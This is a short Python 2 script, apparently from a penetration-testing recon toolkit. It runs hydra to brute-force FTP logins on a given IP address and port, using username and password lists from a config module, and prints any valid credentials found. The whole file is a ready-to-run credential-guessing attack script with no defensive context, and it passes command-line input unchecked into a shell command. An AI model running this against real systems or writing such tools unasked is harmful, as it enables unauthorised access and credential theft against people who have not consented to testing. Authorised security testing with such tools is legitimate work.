#!/usr/bin/env python
import subprocess
import sys
import reconf
from reconf import *

if len(sys.argv) != 3:
    print "Usage: brute_ftp.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

print "INFO: Performing hydra ftp scan against " + ip_address
HYDRA = "hydra -L %s -P %s -f -o %s/%s_ftphydra.txt -u %s -s %s ftp" % (reconf.usrlst, reconf.pwdlst, reconf.rsltpth, ip_address, ip_address, port)
try:
    print "[+] Executing - %s" % (HYDRA)
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
	    print "[*] Valid ftp credentials found: " + result
except:
    print "INFO: No valid ftp credentials found"
